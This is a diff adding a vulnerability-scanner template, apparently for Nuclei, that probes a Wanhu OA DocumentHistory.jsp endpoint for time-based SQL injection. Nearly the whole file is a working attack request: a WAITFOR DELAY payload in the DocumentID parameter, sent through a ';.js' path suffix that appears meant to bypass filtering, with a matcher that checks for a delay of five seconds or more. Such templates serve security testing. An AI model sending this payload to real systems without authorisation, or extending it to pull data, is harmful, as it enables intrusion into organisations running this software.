@@ -1,0 +1,21 @@
+id: wanhu-DocumentHistory-sql-injection-time-delay
+
+info:
+  name: SQLi Time Delay (Windows Compatible)
+  author: iSee857
+  severity: high
+  description: wanhu DocumentHistory sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
